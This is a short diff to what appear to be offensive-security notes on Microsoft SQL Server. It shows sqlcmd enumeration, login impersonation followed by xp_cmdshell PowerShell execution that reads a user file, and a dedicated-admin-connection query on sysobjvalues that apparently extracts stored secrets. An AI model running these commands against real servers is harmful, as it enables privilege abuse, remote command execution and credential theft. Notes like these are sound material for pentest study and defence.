@@ -16,8 +16,7 @@ sqlcmd -C -E -Q "Select @@version"
 sqlcmd -C -E -Q "SELECT name FROM sys.databases;"
 
 # show tables
-USE msdb
-sqlcmd -C -E -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
+sqlcmd -C -E -Q "USE msdb;SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
 
 
   
@@ -38,3 +37,7 @@ EXECUTE AS LOGIN='svc_reports' EXEC xp_cmdshell 'powershell -c "type C:\Users\sv
 
 # quote
 EXECUTE AS LOGIN='svc_reports' EXEC xp_cmdshell 'powershell -c "$aaa=\"123\";$aaa;"';
+
+
+# Notice Server must be specific , but this permision is still different with DAC, this is very weild
+sqlcmd -C -E -S "ADMIN:UNCLAIMED" -Q "SELECT * FROM master.sys.sysobjvalues WHERE valclass = 28;"
